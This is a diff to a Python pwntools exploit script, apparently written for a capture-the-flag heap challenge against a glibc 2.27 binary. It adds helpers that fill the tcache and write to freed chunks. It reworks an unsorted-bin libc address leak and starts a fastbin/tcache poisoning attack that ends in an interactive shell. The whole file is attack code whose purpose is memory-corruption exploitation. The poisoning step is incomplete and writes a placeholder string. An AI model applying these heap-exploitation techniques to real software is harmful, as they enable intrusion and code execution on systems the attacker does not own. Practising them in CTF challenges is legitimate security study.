@@ -45,6 +45,12 @@ def rop_chain(chain):
 		chain[i] = p64(chain[i])
 	return reduce(lambda x, y: x + y, chain)
 
+def fill_tcache(r, chunk_size=0x20):
+	as_tcache = [alloc(r, chunk_size) for i in range(7)]
+	alloc(r, 0x10) #coalescing
+	for a_chunk in as_tcache:
+		free(r, a_chunk)
+
 def get_a_main(r):
 	r.recvuntil(b"main: ")
 	return bytes2int(r.recvline(keepends=False))
@@ -71,6 +77,13 @@ def get_leak_libc(r):
 	r.recvuntil(b"0x")
 	r.unrecv(b"0x")
 	return bytes2int(r.recvline(keepends=False))
+
+def write(r, a, data, size):
+	r.clean()
+	send(r, "write " + str(a) + " " + str(size))
+	r.recvline()
+	send(r, data)
+	r.recvuntil(b"==> done")
 
 #I/O functions
 
@@ -101,24 +114,25 @@ else:
 LIBC = ELF("./libc-2.27.so")
 #LIBC.symbols["__symol_name"]
 
+
 time.sleep(0.5)
 
 a_main = get_a_main(r)
 print("leak main: ", hex(a_main))
 
-#FILL TCACHE
-for i in range(7):
-	alloc(r, 0x20)
-
 #LEAK LIBC
 a_heap = alloc(r, 0x600)
 print("leak heap:", hex(a_heap))
-alloc(r, 0x20)
+alloc(r, 0x10)						# no coalescing
 free(r, a_heap)
 show(r, a_heap, 1)
 LIBC.address = get_leak_libc(r) - 0x3ebca0
 print("leak libc", hex(LIBC.address))
 
+#FASTBIN ATTACK
 
-
+a = alloc(r, 0x20)
+free(r, a)
+write(r, a, "ciao", 4)
+alloc(r, 0x20)
 r.interactive()
